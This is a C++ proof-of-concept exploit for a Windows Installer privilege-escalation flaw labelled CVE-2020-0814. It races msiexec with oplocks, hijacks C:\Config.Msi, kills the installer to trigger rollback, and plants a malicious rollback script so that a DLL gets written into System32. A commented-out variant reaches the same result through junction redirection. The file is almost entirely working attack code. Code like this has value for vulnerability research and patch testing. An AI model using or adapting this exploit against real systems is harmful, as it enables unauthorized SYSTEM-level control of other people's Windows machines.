///////////////////////////////////////////////////////////////////////////////////
/////////////Windows Installer Elevation Of Privileges Vulnerability CVE-2020-0814
//////////////////////////////////////////////////////////////////////////////////


#include "stdafx.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include <windows.h>
#include <iostream>
#include <shlobj.h>
#include <conio.h>
#include <windows.h>
#include <ctime>
#include <wchar.h>
#include <io.h>
#include <process.h>
#include <cstdlib>
#include "resource.h"
#include <stdio.h>
#include <random>
#include <cstdio>
#include <Tlhelp32.h>
#include <fstream>
#pragma comment(lib, "shell32.lib")

using std::cout;
using std::endl;
using std::cin;
using std::wcout;
using std::wstring;
using std::string;

HMODULE hm = GetModuleHandle(NULL);
HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_RBS1), L"rbs");
DWORD DllSize = SizeofResource(hm, res);
void* dllBuff = LoadResource(hm, res);
HRSRC res2 = FindResource(hm, MAKEINTRESOURCE(IDR_RBF1), L"rbf");
DWORD DllSize2 = SizeofResource(hm, res2);
void* dllBuff2 = LoadResource(hm, res2);
DWORD sizeout;
HANDLE file = INVALID_HANDLE_VALUE;
static std::default_random_engine generator;
HANDLE hFind;
WIN32_FIND_DATA FindFileData;

void KillProcessByName(const wchar_t* fileName)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (wcscmp(pEntry.szExeFile, fileName) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}
wstring GenRandomW(_In_ int lenght = 32) {
	wstring rvalue = L"\0";
	wstring characters =
		L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNIPQRSTUVWXYZ0123456789";
	std::uniform_int_distribution<int> distribution(0, characters.length());
	for (int i = 0; i <= lenght; i++) {
		rvalue += characters[distribution(generator)];
	}
	return rvalue;
}
bool RenameByHandle(HANDLE hfile, wchar_t* Original, wchar_t* Renamed) {
	auto destFilenameLength = wcslen(Renamed);
	auto bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
	auto buffer = _alloca(bufferSize);
	memset(buffer, 0, bufferSize);
	auto const fri = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
	fri->ReplaceIfExists = TRUE;
	fri->FileNameLength = destFilenameLength;
	wmemcpy(fri->FileName, Renamed, destFilenameLength);
	if (!SetFileInformationByHandle(hfile, FileRenameInfo, fri, bufferSize))
	{
		return 0;
	}
	else
		return 1;
}
void FindFile(void) {
	do
	{
		hFind = FindFirstFile(L"C:\\Config.Msi\\*.rbs", &FindFileData);
	} while (hFind == INVALID_HANDLE_VALUE);
}
void unlock() {
	cout << "Done !"<<endl;
	cout << "[!] Waiting Sometime To Unlock ..." << endl;
	Sleep(5000);
}
HANDLE hdir = INVALID_HANDLE_VALUE;
wstring target1 = L"C:\\Config.Msi-" + GenRandomW();
wstring target2 = L"C:\\Config.Msi-" + GenRandomW();
wchar_t* asmae = const_cast<wchar_t*>(target1.c_str());
wchar_t* me = const_cast<wchar_t*>(target2.c_str());
void unlock1() {
	cout << "Done !" << endl;
	cout << "[!] Waiting Sometime To Unlock ..." << endl;
	Sleep(5000);
	RenameByHandle(hdir, L"C:\\Config.Msi", asmae);
	CreateDirectory(L"C:\\Config.Msi",NULL);
}
void unlock2() {
	cout << "Done !" << endl;
}
int wmain(int argc, wchar_t* argv[]) {
	cout << "[#] Author : Abdelhamid Naceri" << endl;
	cout << "[#] CVE-2020-0814" << endl;
	cout << "[+] Adjusting Current Process Priority ... ";
	HANDLE thread = GetCurrentThread();
	SetThreadPriority(thread, THREAD_PRIORITY_TIME_CRITICAL);
	cout << "Done !" << endl;
	cout << "[+] Waiting Directory Creation ... ";
	FileOpLock* oplock = nullptr;
	do {
		oplock = FileOpLock::CreateLock(L"C:\\Config.Msi", unlock);
	} while (oplock == nullptr);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	Sleep(5);
	cout << "[+] Attempting To Acquire Handle To C:\\Config.Msi ... ";
	do {
		hdir = CreateFileW(L"C:\\Config.Msi",
			GENERIC_READ | DELETE,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			NULL, OPEN_EXISTING,
			FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_POSIX_SEMANTICS,
			NULL);
		if (GetLastError() == 5) {
			cout << "Fail : ACCESS_IS_DENIED"; 
			return 1;
		}
	} while (hdir == INVALID_HANDLE_VALUE);
	cout << "Done !" << endl;
	cout << "[+] HANDLE : " << hdir << endl;
	cout << "[!] Waiting ACL Write On C:\\Config.Msi ... ";
	do {//detect SetSecurityFile on C:\Config.Msi
		oplock = FileOpLock::CreateLock(L"C:\\Config.Msi",unlock1,hdir);
	} while (oplock == nullptr);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
	}
	cout << "[!] Waiting RollBack Script To Be Created ... ";
	FindFile();
	cout << "Done !" << endl;
	wcout << L"[+] Renaming C:\\Config.Msi To " << target2 << " ... ";
	hdir = CreateFileW(L"C:\\Config.Msi",
			GENERIC_READ | DELETE,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,//sharing is important
			NULL, OPEN_EXISTING,
			FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_POSIX_SEMANTICS,
			NULL);
	while(!RenameByHandle(hdir, L"C:\\Config.Msi", me)){}
	cout << "Done !" << endl;
	cout << "[+] Creating C:\\Config.Msi Again ... ";
	CreateDirectory(L"C:\\Config.Msi",NULL);
	cout << "Done !" << endl;
	wcout << L"[+] Creating C:\\Config.Msi\\" << FindFileData.cFileName << " ... ";
	file = CreateFile(wstring(L"C:\\Config.Msi\\" + wstring(FindFileData.cFileName)).c_str(),
		NULL,
		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
		NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if (file == INVALID_HANDLE_VALUE) {
		cout <<endl<< "[-] Something Went Wrong :( ! "<<GetLastError();
		return 1;
	}
	cout << "OK !" << endl;
	cout << "[+] OpLocking Target And Waiting Write Access ... ";

	oplock = FileOpLock::CreateLock(wstring(L"C:\\Config.Msi\\" + wstring(FindFileData.cFileName)).c_str(), unlock2);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	CloseHandle(file);
	Sleep(5);
	cout << "[+] Killing Installer UI To Trigger RollBack ... Done !" << endl;
	KillProcessByName(L"msiexec.exe");
	cout << "[+] Handling File Again ... ";
	do {
		file = CreateFileW(wstring(L"C:\\Config.Msi\\" + wstring(FindFileData.cFileName)).c_str(),
			GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			NULL, CREATE_ALWAYS//this will overwrite the file
			,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
	} while (file == INVALID_HANDLE_VALUE);
	cout << "Done !" << endl;
	cout << "[+] Writing Malicious RBS file to target ... ";
	if (!WriteFile(file, dllBuff, DllSize, &sizeout, NULL)) {
		cout << "Something Went Wrong !! : "<<GetLastError();
		return 1;
	}
	cout << "Done !"<<endl;
	cout << "[+] Creating and Writting Content To RBF File ... ";
	file = CreateFileW(L"C:\\Config.Msi\\test1.rbf",
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	WriteFile(file, dllBuff2, DllSize2, &sizeout, NULL);
	cout << "Done !";
	cout << endl << "[+] Check C:\\Windows\\System32\\oops.dll";
	return 0;
}
/*
using namespace std;
bool triggered = false;
void UnlockFile()
{
	printf("triggered");
	triggered = true;
}
int _tmain()
{
	RemoveDirectory(L"c:\\new");
	RemoveDirectory(L"c:\\new2");
	RemoveDirectory(L"c:\\new3");
	CreateDirectory(L"c:\\new", NULL);
	CreateDirectory(L"c:\\new2", NULL);
	CreateDirectory(L"c:\\new3", NULL);
	CreateDirectory(L"c:\\config.msi", NULL);
	FileOpLock::CreateLock(L"c:\\config.msi", UnlockFile);
	LARGE_INTEGER li;
	HANDLE thread =  GetCurrentThread();
	SetThreadPriority(thread, THREAD_PRIORITY_TIME_CRITICAL);
	bool succesful = false;
		while (triggered == false)
	{
		QueryPerformanceCounter(&li);
	}
	triggered = false;
	FileOpLock::CreateLock(L"c:\\config.msi", UnlockFile);
	while (triggered == false)
	{
		QueryPerformanceCounter(&li);
	}
	triggered = false;
	do
	{
		HANDLE hJunction = CreateFile(L"c:\\config.msi", GENERIC_READ | FILE_WRITE_DATA,
			FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
			nullptr);
		succesful = ReparsePoint::CreateMountPoint(hJunction, L"c:\\new", L"");
		CloseHandle(hJunction);
	} while (succesful == false);
	wchar_t path[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, path);
	LPWSTR filename = L"\\test.rbs";
	wcscat_s(path, MAX_PATH, filename);
	LPCWSTR root = L"c:\\new3\\";
	wchar_t path2[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, path2);
	LPWSTR filename2 = L"\\test.rbf";
	wcscat_s(path2, MAX_PATH, filename2);
	//NEW -> NEW2
	HANDLE hJunction = CreateFile(L"c:\\new", GENERIC_READ | FILE_WRITE_DATA,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
		nullptr);
	ReparsePoint::CreateMountPoint(hJunction, L"c:\\new2", L"");
	CloseHandle(hJunction);
	HANDLE hFind;
	WIN32_FIND_DATA FindFileData;
	do
	{
		hFind = FindFirstFile(L"c:\\new\\*.rbs", &FindFileData);
	} while (hFind == INVALID_HANDLE_VALUE);
	LPCWSTR filename1 = FindFileData.cFileName;
	std::wstring df = std::wstring(root) + filename1;
	LPCWSTR dfc = df.c_str();
	CopyFile(path, dfc, true);
	CopyFile(path2, L"c:\\new3\\test1.rbf", true);
	//NEW -> NEW3 
	HANDLE hJunction3 = CreateFile(L"c:\\new", GENERIC_READ | FILE_WRITE_DATA,FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,nullptr);
	ReparsePoint::CreateMountPoint(hJunction3, L"c:\\new3", L"");
	CloseHandle(hJunction3);
	printf("\nPRESS CANCEL NOW TO TRIGGER ROLLBACK!");
	getchar();
	RemoveDirectory(L"c:\\new");
	RemoveDirectory(L"c:\\new2");
	RemoveDirectory(L"c:\\new3");
return 0;
}
*/




